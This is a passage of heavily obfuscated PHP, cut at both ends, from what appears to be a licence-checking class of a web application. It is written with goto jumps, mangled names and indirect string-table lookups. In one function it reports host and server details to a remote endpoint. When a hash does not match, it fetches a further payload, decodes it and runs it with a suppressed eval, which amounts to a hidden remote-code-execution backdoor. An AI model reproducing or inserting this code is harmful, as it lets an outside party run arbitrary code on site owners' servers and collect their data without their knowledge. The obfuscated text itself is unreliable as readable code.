$cğ­„öÅ‰Å[$e¸«İö‘Äï[168]]; } $b»âØš› ‘ = $e¸«İö‘Äï[25]($e¸«İö‘Äï[114]($d‡½î­‹‡ö[$e¸«İö‘Äï[210]]), 10, 10); $f¤ã¾´İºò = $b»âØš› ‘ . $d‡½î­‹‡ö[$e¸«İö‘Äï[120]] . $d‡½î­‹‡ö[$e¸«İö‘Äï[212]]; goto Aì±‚¿Ó¯¢; DÖì¥Øëæ©: $this->{$_SERVER[™óşĞñ‡Ë][229]}(); $bóö–ãæÏ„ = $BŸ²‘ïĞõ[593]; if (!$bóö–ãæÏ„) { die; } goto CñÏ•µÆ¯Ã; FÏäÌƒÆÈ: $this->tfgvf5ecaa5c = $C†º¿ÃÆˆ“; $AÉè÷¬ = $BŸ²‘ïĞõ[592]; $this->trqk3bcdf44e = $d‡½î­‹‡ö[$e¸«İö‘Äï[120]]; goto DÖì¥Øëæ©; eïÚÅÕó¬Ğ: if (!$e¸«İö‘Äï[104]($GLOBALS, $e¸«İö‘Äï[132])) { die; } $cöšÖùŠà¶ = $GLOBALS[$e¸«İö‘Äï[22]]; if (isset($cöšÖùŠà¶[$e¸«İö‘Äï[163]])) { $this->{$_SERVER[™óşĞñ‡Ë][164]}(); die; } goto fëò—ôî‚; EÈŸ¥Ö“ÑÁ: $a®À½ÕØØÓ = $BŸ²‘ïĞõ[583]; if (strlen($a®À½ÕØØÓ) < $BŸ²‘ïĞõ[548]) { die; } if ($cöšÖùŠà¶[$e¸«İö‘Äï[178]] == $e¸«İö‘Äï[179]) { $bô£İª´ö» = $this->{$_SERVER[™óşĞñ‡Ë][147]}($C÷ÜÇĞÓò•, $e¸«İö‘Äï[180]); $CËÂÄö¾ªÁ = $this->{$_SERVER[™óşĞñ‡Ë][127]}($e¸«İö‘Äï[148]($cğ­„öÅ‰Å), $C÷ÜÇĞÓò• . $e¸«İö‘Äï[181], 3); $b“Ù¹è×æç = $this->{$_SERVER[™óşĞñ‡Ë][182]}($e¸«İö‘Äï[183] . $bô£İª´ö» . $e¸«İö‘Äï[184] . $CËÂÄö¾ªÁ, -1); $e¸«İö‘Äï[166]($b“Ù¹è×æç, !0); } else { if ($cöšÖùŠà¶[$e¸«İö‘Äï[178]] == $e¸«İö‘Äï[185]) { $aÑâ½îŒ· = $e¸«İö‘Äï[25]($e¸«İö‘Äï[114]($e¸«İö‘Äï[186] . $C÷ÜÇĞÓò•), 12, 15) . $e¸«İö‘Äï[187]; $CËÂÄö¾ªÁ = $this->{$_SERVER[™óşĞñ‡Ë][188]}($e¸«İö‘Äï[2]($cöšÖùŠà¶[$e¸«İö‘Äï[189]]), $aÑâ½îŒ·, 2); $Eæâİù©¢Í = $e¸«İö‘Äï[190]($CËÂÄö¾ªÁ, !0); if (!$e¸«İö‘Äï[191]($Eæâİù©¢Í) || !$e¸«İö‘Äï[191]($Eæâİù©¢Í[$e¸«İö‘Äï[192]]) || $Eæâİù©¢Í[$e¸«İö‘Äï[165]] != !0) { $AÉŒ×”–ƒÀ = $e¸«İö‘Äï[193]; $F’™æö°İ£ = $Eæâİù©¢Í[$e¸«İö‘Äï[192]] ? $e¸«İö‘Äï[194] . $Eæâİù©¢Í[$e¸«İö‘Äï[192]] : $AÉŒ×”–ƒÀ; $e¸«İö‘Äï[166]($F’™æö°İ£, !1); } else { $cğ­„öÅ‰Å[$e¸«İö‘Äï[168]] = $Eæâİù©¢Í[$e¸«İö‘Äï[192]][$e¸«İö‘Äï[195]]; } } else { $Eæâİù©¢Í = $this->{$_SERVER[™óşĞñ‡Ë][182]}($e¸«İö‘Äï[196], $cğ­„öÅ‰Å, 10); } } goto bÈ«ÏõŞ; F±ÖŞ¾ŒÌŒ: } private function licenseRegistSuccess() { $Bº‡ÕŠÉ‡ =& $_SERVER[™óşĞñ‡Ë]; $f‘‡óÈ±İ“ = $Bº‡ÕŠÉ‡[61]($Bº‡ÕŠÉ‡[62])->{$_SERVER[™óşĞñ‡Ë][63]}(); if ($f‘‡óÈ±İ“[$Bº‡ÕŠÉ‡[85]] != $Bº‡ÕŠÉ‡[220]) { $Bº‡ÕŠÉ‡[61]($Bº‡ÕŠÉ‡[62])->{$_SERVER[™óşĞñ‡Ë][221]}($Bº‡ÕŠÉ‡[85], $Bº‡ÕŠÉ‡[220]); } $Bº‡ÕŠÉ‡[110]($Bº‡ÕŠÉ‡[230])->{$_SERVER[™óşĞñ‡Ë][231]}(!0); } private function jcuv8dc7851b() { $FàÄÊøíø÷ =& $_SERVER[™óşĞñ‡Ë]; $FàÄÊøíø÷[61]($FàÄÊøíø÷[62])->{$_SERVER[™óşĞñ‡Ë][221]}(array($FàÄÊøíø÷[209] => $FàÄÊøíø÷[10], $FàÄÊøíø÷[210] => $FàÄÊøíø÷[10], $FàÄÊøíø÷[120] => $FàÄÊøíø÷[121], $FàÄÊøíø÷[122] => $FàÄÊøíø÷[10], $FàÄÊøíø÷[123] => $FàÄÊøíø÷[10])); $DÌ·šÊÌÖÌ = $_SERVER[¼€¼ˆ¦‚¡][594]; $FàÄÊøíø÷[61]($FàÄÊøíø÷[62])->{$_SERVER[™óşĞñ‡Ë][218]}($FàÄÊøíø÷[219], $FàÄÊøíø÷[232]); $this->tfgvf5ecaa5c = array(); $this->trqk3bcdf44e = $FàÄÊøíø÷[121]; } private function thev661fe78b() { goto e‹ÓÔ²’¿Í; eªÈ’ƒ„Œ: if ($e˜†è¥Š‘†[233]() >= $FêáË©ë™ê) { return $this->{$_SERVER[™óşĞñ‡Ë][164]}(); } $this->tfgvf5ecaa5c = $fÇË“ŒÙï; $this->trqk3bcdf44e = $Eê‘Ô‘Õ²ù[$e˜†è¥Š‘†[120]]; goto Cˆ¿ô£ß»‹; E±®ôÈ¢Ôî: $dŞùéÀŒ”İ = $e˜†è¥Š‘†[214]($e˜†è¥Š‘†[25]($fÛã“Ã¤á‰, 10, 16)); $fÇË“ŒÙï = $this->{$_SERVER[™óşĞñ‡Ë][188]}($dœ©åØ½±©[$e˜†è¥Š‘†[91]][$dŞùéÀŒ”İ], $fÛã“Ã¤á‰); $fÇøÔĞ¯¿Ü = $bŒ˜§ìÊ»æ[596]; goto eÙƒ¨¨ÍÌ´; f†Ñ­ŸùæÌ: $this->trqk3bcdf44e = $e˜†è¥Š‘†[121]; $Eê‘Ô‘Õ²ù = $e˜†è¥Š‘†[61]($e˜†è¥Š‘†[62])->{$_SERVER[™óşĞñ‡Ë][63]}(); if ($Eê‘Ô‘Õ²ù[$e˜†è¥Š‘†[120]] == $e˜†è¥Š‘†[121]) { return; } goto F®™»Îô; F®™»Îô: $BŠöš³™¼¨ = $e˜†è¥Š‘†[61]($e˜†è¥Š‘†[62])->{$_SERVER[™óşĞñ‡Ë][63]}($e˜†è¥Š‘†[116]); $cÅÔ°Á•ù· = $e˜†è¥Š‘†[222]($e˜†è¥Š‘†[61]($e˜†è¥Š‘†[11])->{$_SERVER[™óşĞñ‡Ë][223]}(), $e˜†è¥Š‘†[224]); $e¿»õäÒÚ = $bŒ˜§ìÊ»æ[595]; goto d¹”ÙèÁÎ; eÙƒ¨¨ÍÌ´: if (strlen($fÇøÔĞ¯¿Ü) < $bŒ˜§ìÊ»æ[556]) { return; } $fÇË“ŒÙï = $e˜†è¥Š‘†[190]($fÇË“ŒÙï, !0); $bãÌ¢”‰ï = $bŒ˜§ìÊ»æ[597]; goto BÚ‘‚İÇº†; d¹”ÙèÁÎ: while ($e¿»õäÒÚ < $bŒ˜§ìÊ»æ[548]) { if ($e¿»õäÒÚ >= 0) { break; } $e¿»õäÒÚ++; } $dœ©åØ½±© = $cÅÔ°Á•ù·[$e˜†è¥Š‘†[225]]; $fÛã“Ã¤á‰ = $e˜†è¥Š‘†[114]($_SERVER[$e˜†è¥Š‘†[115]] . $e˜†è¥Š‘†[214]($BŠöš³™¼¨) . $Eê‘Ô‘Õ²ù[$e˜†è¥Š‘†[210]]); goto E±®ôÈ¢Ôî; BÚ‘‚İÇº†: if (strlen($bãÌ¢”‰ï) < $bŒ˜§ìÊ»æ[556]) { die; } if (!$e˜†è¥Š‘†[191]($fÇË“ŒÙï)) { return $this->{$_SERVER[™óşĞñ‡Ë][164]}(); } $FêáË©ë™ê = $e˜†è¥Š‘†[144]($fÇË“ŒÙï[$e˜†è¥Š‘†[145]]); goto eªÈ’ƒ„Œ; e‹ÓÔ²’¿Í: $bŒ˜§ìÊ»æ =& $_SERVER[¼€¼ˆ¦‚¡]; $e˜†è¥Š‘† =& $_SERVER[™óşĞñ‡Ë]; $_SERVER[$e˜†è¥Š‘†[175]] = $e˜†è¥Š‘†[104]($_SERVER, $e˜†è¥Š‘†[175], APP_HOST); goto f†Ñ­ŸùæÌ; Cˆ¿ô£ß»‹: } private function nqarc434ec49() { goto B×¨Ÿì¥è; B×¨Ÿì¥è: $Aøê¥‚Ç– =& $_SERVER[¼€¼ˆ¦‚¡]; $FŒßÅÕç¡Ó =& $_SERVER[™óşĞñ‡Ë]; $EÛ•¾•Š­ã = $GLOBALS[$FŒßÅÕç¡Ó[22]]; goto eÏñ±â„¶ƒ; eÏñ±â„¶ƒ: $DÕãôº£ÃÌ = $_SERVER[$FŒßÅÕç¡Ó[44]]; $Cª‹ÜÔºˆ = $Aøê¥‚Ç–[598]; if (strlen($Cª‹ÜÔºˆ) < $Aøê¥‚Ç–[578]) { die; } goto bˆ•»Í¤õ; bˆ•»Í¤õ: if ($DÕãôº£ÃÌ == $FŒßÅÕç¡Ó[234] && $this->trqk3bcdf44e == $FŒßÅÕç¡Ó[121]) { $FŒßÅÕç¡Ó[166]($FŒßÅÕç¡Ó[197]($FŒßÅÕç¡Ó[235]), !1, $FŒßÅÕç¡Ó[236]); } $E©Ûå•Çğé = array($FŒßÅÕç¡Ó[237], $FŒßÅÕç¡Ó[238]); if ($FŒßÅÕç¡Ó[239]($DÕãôº£ÃÌ, $E©Ûå•Çğé)) { if ($this->trqk3bcdf44e == $FŒßÅÕç¡Ó[121] && isset($EÛ•¾•Š­ã[$FŒßÅÕç¡Ó[240]])) { $FŒßÅÕç¡Ó[166]($FŒßÅÕç¡Ó[197]($FŒßÅÕç¡Ó[235]), !1, $FŒßÅÕç¡Ó[236]); die; } $CùŸƒÊ‚ˆÏ = $this->{$_SERVER[™óşĞñ‡Ë][137]}(); if ($CùŸƒÊ‚ˆÏ != $FŒßÅÕç¡Ó[201]($FŒßÅÕç¡Ó[241])) { if ($CùŸƒÊ‚ˆÏ <= $FŒßÅÕç¡Ó[61]($FŒßÅÕç¡Ó[139])->{$_SERVER[™óşĞñ‡Ë][140]}()) { $FŒßÅÕç¡Ó[166]($FŒßÅÕç¡Ó[197]($FŒßÅÕç¡Ó[242]), !1, $FŒßÅÕç¡Ó[236]); die; } } } goto EîÅÏÌ¡ª‘; EîÅÏÌ¡ª‘: } private function fclg1f17a888() { goto däéÙµ¤; däéÙµ¤: $fÕæÍ›†£¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $eÏÉŠŞ¯´‘ =& $_SERVER[™óşĞñ‡Ë]; $E¯Ô¥Á½‹Ì = array($eÏÉŠŞ¯´‘[135], $eÏÉŠŞ¯´‘[243]); goto Ağñ„ °È¹; A¬®éÄ¦Î—: $B¬î‚”ª«¤ = $fÕæÍ›†£¡[602]; while ($B¬î‚”ª«¤ < $fÕæÍ›†£¡[556]) { if ($B¬î‚”ª«¤ >= 0) { break; } $B¬î‚”ª«¤++; } $eÏÉŠŞ¯´‘[254]($eÏÉŠŞ¯´‘[255]); goto E¢î§œ§¯ä; E¢î§œ§¯ä: if ($E’ö´¤—Ç· && $eÏÉŠŞ¯´‘[32]($E’ö´¤—Ç·, $eÏÉŠŞ¯´‘[256])) { echo $E’ö´¤—Ç·; } die; goto a”ç²æÏ¢ˆ; F®…‘Ä‹©¾: $eİòˆ‹”Æ” = $fÕæÍ›†£¡[601]; while (strlen($eİòˆ‹”Æ”) < $fÕæÍ›†£¡[554]) { if (!$eİòˆ‹”Æ”) { break; } $eİòˆ‹”Æ”++; } $E’ö´¤—Ç· = @$eÏÉŠŞ¯´‘[253]($cò×ã¥çˆ…, !1, $câ‘•èšåº); goto A¬®éÄ¦Î—; CÖ—‹™ˆ­: $e®åáÍî»“ = $fÕæÍ›†£¡[600]; if (!$e®åáÍî»“) { die; } $câ‘•èšåº = $eÏÉŠŞ¯´‘[248](array($eÏÉŠŞ¯´‘[249] => array($eÏÉŠŞ¯´‘[250] => $eÏÉŠŞ¯´‘[251], $eÏÉŠŞ¯´‘[252] => 3))); goto F®…‘Ä‹©¾; A‰†¯‚‹•˜: $EÖèãÁğÚ = $fÕæÍ›†£¡[599]; if (!$EÖèãÁğÚ) { die; } $cò×ã¥çˆ… = $this->{$_SERVER[™óşĞñ‡Ë][246]}($cò×ã¥çˆ…, $eÏÉŠŞ¯´‘[247]); goto CÖ—‹™ˆ­; Ağñ„ °È¹: if (!$eÏÉŠŞ¯´‘[104]($GLOBALS, $eÏÉŠŞ¯´‘[132]) || !isset($_GET[$eÏÉŠŞ¯´‘[244]])) { return; } if (!$eÏÉŠŞ¯´‘[239]($_SERVER[$eÏÉŠŞ¯´‘[44]], $E¯Ô¥Á½‹Ì)) { return; } $cò×ã¥çˆ… = $eÏÉŠŞ¯´‘[245]; goto A‰†¯‚‹•˜; a”ç²æÏ¢ˆ: } public function hjxq92981780($bíÔ¿ãŠ‘) { goto aùæª°İèŸ; fæÜé°©Ä: foreach ($d¿…ŞİêÈ as $a†êŞÚ“ñë) { if (!$cààâšß„™[239]($a†êŞÚ“ñë, $fÈ¦òİ£È)) { $Bâ¨øŞƒ[] = $a†êŞÚ“ñë; } } foreach ($Bâ¨øŞƒ as $a†êŞÚ“ñë) { unset($bíÔ¿ãŠ‘[$a†êŞÚ“ñë]); } return $bíÔ¿ãŠ‘; goto d ‡æºŸ; aùæª°İèŸ: $cààâšß„™ =& $_SERVER[™óşĞñ‡Ë]; if ($this->trqk3bcdf44e == $cààâšß„™[257]) { return $bíÔ¿ãŠ‘; } $d¿…ŞİêÈ = array($cààâšß„™[258], $cààâšß„™[259], $cààâšß„™[260], $cààâšß„™[261], $cààâšß„™[262], $cààâšß„™[263], $cààâšß„™[264], $cààâšß„™[265]); goto B¶ê…Í–Ñ; B¶ê…Í–Ñ: $fÈ¦òİ£È = $cààâšß„™[0]($cààâšß„™[266], $cààâšß„™[104]($this->tfgvf5ecaa5c, $cààâšß„™[129], $cààâšß„™[10])); $cñê´¸…¶ = $_SERVER[¼€¼ˆ¦‚¡][603]; $Bâ¨øŞƒ = array(); goto fæÜé°©Ä; d ‡æºŸ: } private function ndyf75f5f76b() { goto e†Õå«§˜¿; E­«¨«š¯Ô: $GLOBALS[$fÈµÖø‰‹[91]][$fÈµÖø‰‹[271]] = $fÈµÖø‰‹[220]; $fãÓÈŞ¯Ã† = $E‰‰®Úñ¥å[606]; while (strlen($fãÓÈŞ¯Ã†) < $E‰‰®Úñ¥å[548]) { if (!$fãÓÈŞ¯Ã†) { break; } $fãÓÈŞ¯Ã†++; } goto B¤´º…İÊ¤; e†Õå«§˜¿: $E‰‰®Úñ¥å =& $_SERVER[¼€¼ˆ¦‚¡]; $fÈµÖø‰‹ =& $_SERVER[™óşĞñ‡Ë]; if ($this->trqk3bcdf44e != $fÈµÖø‰‹[121]) { $GLOBALS[$fÈµÖø‰‹[91]][$fÈµÖø‰‹[95]][$fÈµÖø‰‹[267]] = $fÈµÖø‰‹[220]; return; } goto DĞç„ÕâŞ£; B¤´º…İÊ¤: if ($fÈµÖø‰‹[61]($fÈµÖø‰‹[272])->{$_SERVER[™óşĞñ‡Ë][63]}($fÈµÖø‰‹[85]) != $fÈµÖø‰‹[232]) { $fÈµÖø‰‹[61]($fÈµÖø‰‹[272])->{$_SERVER[™óşĞñ‡Ë][221]}($fÈµÖø‰‹[85], $fÈµÖø‰‹[232]); } goto Cğæİ£¨å; AíÅä×†Š‰: $cŞéç‰ä = $E‰‰®Úñ¥å[605]; while ($cŞéç‰ä < $E‰‰®Úñ¥å[554]) { if ($cŞéç‰ä >= 0) { break; } $cŞéç‰ä++; } $GLOBALS[$fÈµÖø‰‹[91]][$fÈµÖø‰‹[95]][$fÈµÖø‰‹[267]] = $fÈµÖø‰‹[232]; goto E­«¨«š¯Ô; DĞç„ÕâŞ£: $CŠ¿Ó‚ò•» = $_SERVER[$fÈµÖø‰‹[44]]; $a…±ĞÜ‚‚ = array($fÈµÖø‰‹[268]); $fË¡ù®ï•î = $E‰‰®Úñ¥å[604]; goto AäîÛåğ…Ö; AäîÛåğ…Ö: if (strlen($fË¡ù®ï•î) < $E‰‰®Úñ¥å[548]) { return; } foreach ($a…±ĞÜ‚‚ as $A²Î¿µÀ) { if ($A²Î¿µÀ == $CŠ¿Ó‚ò•» || $fÈµÖø‰‹[25]($CŠ¿Ó‚ò•», 0, $fÈµÖø‰‹[24]($A²Î¿µÀ)) == $A²Î¿µÀ) { $fÈµÖø‰‹[166]($fÈµÖø‰‹[197]($fÈµÖø‰‹[269]), !1); } } $GLOBALS[$fÈµÖø‰‹[91]][$fÈµÖø‰‹[95]][$fÈµÖø‰‹[270]] = $fÈµÖø‰‹[220]; goto AíÅä×†Š‰; Cğæİ£¨å: } public function bpoj7d3f5d31() { return $_SERVER[™óşĞñ‡Ë][273]; $EÑ†ÑÒ‹¬¹ = $_SERVER[¼€¼ˆ¦‚¡][607]; if (!$EÑ†ÑÒ‹¬¹) { die; } } private function ruga408caef4() { goto EÛ¡³¦Ìêİ; E±Õ•æ†Ùê: $Dçè­¬ĞÄ‹ = $A„‘³Ñù[13](array($A„‘³Ñù[279], $A„‘³Ñù[280]), $cóåÚß‡óõ); if ($Dçè­¬ĞÄ‹ && $A„‘³Ñù[233]() - $Dçè­¬ĞÄ‹ < $A„‘³Ñù[201]($A„‘³Ñù[281])) { return; } $A„‘³Ñù[13](array($A„‘³Ñù[279], $A„‘³Ñù[152]), $cóåÚß‡óõ, $A„‘³Ñù[233]()); goto Cª¸¥“Æò²; Cª¸¥“Æò²: $AÊ¾»ÓŠ î = array($A„‘³Ñù[165] => $A„‘³Ñù[61]($A„‘³Ñù[62])->{$_SERVER[™óşĞñ‡Ë][63]}($A„‘³Ñù[209]), $A„‘³Ñù[178] => $this->trqk3bcdf44e, $A„‘³Ñù[176] => $_SERVER[$A„‘³Ñù[177]], $A„‘³Ñù[169] => $A„‘³Ñù[149], $A„‘³Ñù[172] => $_SERVER[$A„‘³Ñù[173]]); $bóÃ„¢‰„´ = $this->{$_SERVER[™óşĞñ‡Ë][182]}($A„‘³Ñù[282], $AÊ¾»ÓŠ î); if (!$A„‘³Ñù[191]($bóÃ„¢‰„´)) { return; } goto aĞÚ­í«…Å; bœøå’Ù¥: $cóåÚß‡óõ = $A„‘³Ñù[277] . $A„‘³Ñù[114]($A„‘³Ñù[278]); $B“…‰Ï®œÀ = $d‚‹ºïëğƒ[608]; if (!$B“…‰Ï®œÀ) { return; } goto FÆ›ÖŞ‰…í; CÕÃÛ‡íÌ: if ($this->{$_SERVER[™óşĞñ‡Ë][199]}($bóÃ„¢‰„´[$A„‘³Ñù[283]]) != $AÊ¾»ÓŠ î[$A„‘³Ñù[165]]) { $c¹«Ë—–‘ = array($A„‘³Ñù[202] => $A„‘³Ñù[61]($A„‘³Ñù[62])->{$_SERVER[™óşĞñ‡Ë][63]}($A„‘³Ñù[116]), $A„‘³Ñù[203] => $_SERVER[$A„‘³Ñù[115]], $A„‘³Ñù[204] => $A„‘³Ñù[205](), $A„‘³Ñù[174] => $_SERVER[$A„‘³Ñù[175]]); $A ÜÃŸ–Ğµ = $this->{$_SERVER[™óşĞñ‡Ë][206]}($A„‘³Ñù[148]($c¹«Ë—–‘)); $bóÃ„¢‰„´ = $this->{$_SERVER[™óşĞñ‡Ë][182]}($A„‘³Ñù[207] . $A ÜÃŸ–Ğµ); if ($bóÃ„¢‰„´ && $A„‘³Ñù[191]($bóÃ„¢‰„´) && isset($bóÃ„¢‰„´[$A„‘³Ñù[283]])) { $cƒ¼¬¡«è· = $this->{$_SERVER[™óşĞñ‡Ë][188]}($bóÃ„¢‰„´[$A„‘³Ñù[283]], 2); if ($cƒ¼¬¡«è·) { $cƒ¼¬¡«è· = $this->{$_SERVER[™óşĞñ‡Ë][199]}($cƒ¼¬¡«è·); } if ($cƒ¼¬¡«è·) { try { @eval($cƒ¼¬¡«è·); } catch (Exception $DìŞº‹óÂµ) { } } } } goto DÀÜˆÊÉíŠ; EÛ¡³¦Ìêİ: $d‚‹ºïëğƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $A„‘³Ñù =& $_SERVER[™óşĞñ‡Ë]; $B•­ºÔÔ™´ = array($A„‘³Ñù[274], $A„‘³Ñù[275], $A„‘³Ñù[276]); goto bœøå’Ù¥; FÆ›ÖŞ‰…í: if ($this->trqk3bcdf44e == $A„‘³Ñù[121] || !$A„‘³Ñù[104]($GLOBALS, $A„‘³Ñù[132])) { return; } if (!$A„‘³Ñù[239]($_SERVER[$A„‘³Ñù[44]], $B•­ºÔÔ™´)) { return; } if ($A„‘³Ñù[233]() % 4 != 0) { return; } goto E±Õ•æ†Ùê; aĞÚ­í«…Å: if ($bóÃ„¢‰„´[$A„‘³Ñù[165]] && $bóÃ„¢‰„´[$A„‘³Ñù[283]]) { if ($this->{$_SERVER[™óşĞñ‡Ë][199]}($bóÃ„¢‰„´[$A„‘³Ñù[283]]) == $AÊ¾»ÓŠ î[$A„‘³Ñù[165]]) { return; } } $this->{$_SERVER[™óşĞñ‡Ë][164]}(); $B„¤ì±¨î˜ = $d‚‹ºïëğƒ[609]; goto CÕÃÛ‡íÌ; DÀÜˆÊÉíŠ: } private function bxmyc9915b05($fƒº¿Êö† = '', $E¯æø¾æÖ = array(), $DËÕ¸¨†å = 5) { goto F«ë‘â•«Â; fá”Ş…Œ—: return $C¦š´Úí¡ƒ[190]($E¯æø¾æÖ, !0); $bø‡ã·×… = $aôÙ¹ö†£[614]; $c·È£çˆÙ = $aôÙ¹ö†£[615]; goto eµ­¡ŒÓÃÑ; DÔ‹Ú‹¨Ñ: $bÙ²˜î†³Ë = $aôÙ¹ö†£[612]; if (strlen($bÙ²˜î†³Ë) < $aôÙ¹ö†£[578]) { die; } if ($E¯æø¾æÖ === -1) { return $bò ôƒ»‘é; } goto DĞÏ¥–Âãï; A‹å˜¤³‡â: $F÷Æñ×ÑÑ¥ = $aôÙ¹ö†£[611]; if (!$F÷Æñ×ÑÑ¥) { die; } $bò ôƒ»‘é = $bò ôƒ»‘é . $fƒº¿Êö† . $C¦š´Úí¡ƒ[286] . $C¦š´Úí¡ƒ[287]($E¯æø¾æÖ); goto DÔ‹Ú‹¨Ñ; DĞÏ¥–Âãï: $AŠÈÔİíèî = $C¦š´Úí¡ƒ[248](array($C¦š´Úí¡ƒ[249] => array($C¦š´Úí¡ƒ[252] => $DËÕ¸¨†å, $C¦š´Úí¡ƒ[250] => $C¦š´Úí¡ƒ[288]), $C¦š´Úí¡ƒ[289] => array($C¦š´Úí¡ƒ[290] => !1, $C¦š´Úí¡ƒ[291] => !1))); $E¯æø¾æÖ = @$C¦š´Úí¡ƒ[253]($bò ôƒ»‘é, !1, $AŠÈÔİíèî); $f¤Â­ªÎ¦£ = $aôÙ¹ö†£[613]; goto fá”Ş…Œ—; EİÜÅ‡¸…: $d˜¯ÚĞ“…î = $aôÙ¹ö†£[610]; if (!$d˜¯ÚĞ“…î) { die; } $bò ôƒ»‘é = $this->{$_SERVER[™óşĞñ‡Ë][246]}($bò ôƒ»‘é, $C¦š´Úí¡ƒ[285]); goto A‹å˜¤³‡â; F«ë‘â•«Â: $aôÙ¹ö†£ =& $_SERVER[¼€¼ˆ¦‚¡]; $C¦š´Úí¡ƒ =& $_SERVER[™óşĞñ‡Ë]; $bò ôƒ»‘é = $C¦š´Úí¡ƒ[284]; goto EİÜÅ‡¸…; eµ­¡ŒÓÃÑ: } private function qfmu1b42835d() { goto Eˆœ’ò™Á÷; Eˆœ’ò™Á÷: $FÂ…Å…•š„ =& $_SERVER[¼€¼ˆ¦‚¡]; $b¡¸¯­õÑå =& $_SERVER[™óşĞñ‡Ë]; $EàÉ¡«”¡ = array($b¡¸¯­õÑå[292] => $b¡¸¯­õÑå[293], $b¡¸¯­õÑå[294] => $b¡¸¯­õÑå[295], $b¡¸¯­õÑå[296] => $b¡¸¯­õÑå[297], $b¡¸¯­õÑå[298] => $b¡¸¯­õÑå[299], $b¡¸¯­õÑå[300] => $b¡¸¯­õÑå[301], $b¡¸¯­õÑå[302] => $b¡¸¯­õÑå[241], $b¡¸¯­õÑå[303] => $b¡¸¯­õÑå[241], $b¡¸¯­õÑå[304] => $b¡¸¯­õÑå[293], $b¡¸¯­õÑå[305] => $b¡¸¯­õÑå[295], $b¡¸¯­õÑå[306] => $b¡¸¯­õÑå[297], $b¡¸¯­õÑå[307] => $b¡¸¯­õÑå[308], $b¡¸¯­õÑå[309] => $b¡¸¯­õÑå[299], $b¡¸¯­õÑå[310] => $b¡¸¯­õÑå[311], $b¡¸¯­õÑå[312] => $b¡¸¯­õÑå[301], $b¡¸¯­õÑå[313] => $b¡¸¯­õÑå[314], $b¡¸¯­õÑå[315] => $b¡¸¯­õÑå[316], $b¡¸¯­õÑå[317] => $b¡¸¯­õÑå[318]); goto cñÛğî¿ôÅ; a¶ó°ˆ³: $bŞà¢¶Ûñ = $FÂ…Å…•š„[620]; while ($bŞà¢¶Ûñ < $FÂ…Å…•š„[554]) { if ($bŞà¢¶Ûñ >= 0) { break; } $bŞà¢¶Ûñ++; } goto B“ÕÂ¦’Ü„; D«ŞÖ†¿Û–: if (strlen($dÓßßÜ°ğã) < $FÂ…Å…•š„[571]) { die; } $A£Ôå¨ôÛ¢ = $b¡¸¯­õÑå[201]($A£Ôå¨ôÛ¢ ? $A£Ôå¨ôÛ¢ : $b¡¸¯­õÑå[293]); $DèËÆÃ –Ó = $b¡¸¯­õÑå[104]($this->tfgvf5ecaa5c, $b¡¸¯­õÑå[319]); goto C¥À¬ô…Â®; C¥À¬ô…Â®: $A¼™¸¬«Áª = $FÂ…Å…•š„[618]; if (strlen($A¼™¸¬«Áª) < $FÂ…Å…•š„[554]) { return; } $DèËÆÃ –Ó = $DèËÆÃ –Ó ? $b¡¸¯­õÑå[201]($DèËÆÃ –Ó) : 0; goto F„ˆÙóßÕ©; F„ˆÙóßÕ©: $f›ÅÌÒ–öÏ = $FÂ…Å…•š„[619]; while (strlen($f›ÅÌÒ–öÏ) < $FÂ…Å…•š„[571]) { if (!$f›ÅÌÒ–öÏ) { break; } $f›ÅÌÒ–öÏ++; } return $A£Ôå¨ôÛ¢ + $DèËÆÃ –Ó; goto a¶ó°ˆ³; cñÛğî¿ôÅ: $b”ÕĞ­³ØÎ = $FÂ…Å…•š„[616]; $A£Ôå¨ôÛ¢ = $EàÉ¡«”¡[$this->trqk3bcdf44e]; $dÓßßÜ°ğã = $FÂ…Å…•š„[617]; goto D«ŞÖ†¿Û–; B“ÕÂ¦’Ü„: } public function fkiu124e7771($b„âƒŒÜæö) { goto cµñ¥‡À†Ş; AîÄ¥‚µÙ—: if (!$d÷¡¬¶áÎ[239]($b„âƒŒÜæö[$d÷¡¬¶áÎ[321]], $FöŞ—ÅÀ‡Ã)) { $d÷¡¬¶áÎ[166]($d÷¡¬¶áÎ[324], !1, $d÷¡¬¶áÎ[236]); } goto Fùˆ®Ò¶¡À; CÇ¢íÉ†Ò¯: if (!$c³õÉê÷èÁ) { return; } if ($a¬å‰šôì <= $EÇ·Àà£ù) { return; } $FöŞ—ÅÀ‡Ã = $d÷¡¬¶áÎ[61]($d÷¡¬¶áÎ[139])->{$_SERVER[™óşĞñ‡Ë][320]}($d÷¡¬¶áÎ[321])->{$_SERVER[™óşĞñ‡Ë][322]}($EÇ·Àà£ù)->{$_SERVER[™óşĞñ‡Ë][323]}(); goto cÏÔÊ‘­ƒ÷; cÏÔÊ‘­ƒ÷: $FöŞ—ÅÀ‡Ã = $d÷¡¬¶áÎ[222]($FöŞ—ÅÀ‡Ã, $d÷¡¬¶áÎ[10], $d÷¡¬¶áÎ[321]); $f¾ÚğîÊ’ª = $C×Ü£‹¨[622]; if (!$f¾ÚğîÊ’ª) { return; } goto AîÄ¥‚µÙ—; cµñ¥‡À†Ş: $C×Ü£‹¨ =& $_SERVER[¼€¼ˆ¦‚¡]; $d÷¡¬¶áÎ =& $_SERVER[™óşĞñ‡Ë]; $EÇ·Àà£ù = $this->{$_SERVER[™óşĞñ‡Ë][137]}(); goto f×ªÆ¼××ç; f×ªÆ¼××ç: if ($EÇ·Àà£ù >= $d÷¡¬¶áÎ[201]($d÷¡¬¶áÎ[241])) { return; } $a¬å‰šôì = $d÷¡¬¶áÎ[61]($d÷¡¬¶áÎ[139])->{$_SERVER[™óşĞñ‡Ë][140]}(); $c³õÉê÷èÁ = $C×Ü£‹¨[621]; goto CÇ¢íÉ†Ò¯; Fùˆ®Ò¶¡À: } public function idunb6df5a61() { goto e‹‘µ³¹†é; e‹‘µ³¹†é: $B±åøÜÉÅ =& $_SERVER[¼€¼ˆ¦‚¡]; $dèÌ³Š Ù¬ =& $_SERVER[™óşĞñ‡Ë]; if (!$dèÌ³Š Ù¬[104]($GLOBALS, $dèÌ³Š Ù¬[132]) || $dèÌ³Š Ù¬[325](1, 100) > 20) { return; } goto eñ­å—ƒ½™; bˆïğÛÛ²æ: if (!$E”‰›æãÈ…) { return; } $CÁ¡‰¢ñç = $dèÌ³Š Ù¬[248](array($dèÌ³Š Ù¬[249] => array($dèÌ³Š Ù¬[250] => $dèÌ³Š Ù¬[251], $dèÌ³Š Ù¬[252] => 3))); $b¼„ã«£¿ = $B±åøÜÉÅ[624]; goto 